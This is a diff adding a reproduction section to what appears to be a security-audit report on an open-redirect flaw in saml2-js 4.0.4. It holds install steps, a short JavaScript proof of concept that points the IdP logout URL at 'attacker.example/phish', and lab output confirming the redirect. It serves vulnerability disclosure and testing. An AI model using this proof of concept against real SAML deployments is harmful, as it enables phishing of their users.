@@ -47,4 +47,52 @@ The IdP's `sso_logout_url` is used as a redirect target without validation. In d
 
 ---
 
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/npm-saml2-js/`
+
+**Pinned version:** saml2-js 4.0.4
+
+### Steps
+
+1. **Install the package:**
+   ```bash
+   npm install saml2-js@4.0.4
+   ```
+
+2. **Create a PoC** that configures an IdP with an attacker-controlled `sso_logout_url`:
+   ```javascript
+   const saml2 = require('saml2-js');
+   const sp = new saml2.ServiceProvider({ entity_id: 'https://sp.example', assert_endpoint: 'https://sp.example/assert' });
+   const idp = new saml2.IdentityProvider({
+     sso_login_url: 'https://legit-idp.example/sso',
+     sso_logout_url: 'https://attacker.example/phish',  // attacker-controlled
+     certificates: ['MIID...']
+   });
+   sp.create_logout_request_url(idp, {}, (err, logout_url) => {
+     console.log('generated logout URL:', logout_url);
+   });
+   ```
+
+3. **Verify** the logout URL points to the attacker's domain.
+
+### Observed output (from `targets/labs/npm-saml2-js/results.txt`)
+
+```
+saml2-js PoC -- version: 4.0.4
+
+  generated logout URL:
+   https://attacker.example/phish?SAMLRequest=fZBBa4QwEIX%2FiuS%2BGqNu...
+
+  >>> SAML-01 CONFIRMED: attacker-controlled IdP URL was used as redirect target <<<
+```
+
+### Verdict
+
+**CONFIRMED.** The `sso_logout_url` from IdP metadata is used as a redirect target without validation. Deployments that fetch IdP metadata dynamically are vulnerable to open redirect/phishing.
+
+---
+
 **Pipeline:** 13 raw findings → 1 confirmed (1 MEDIUM breachable)
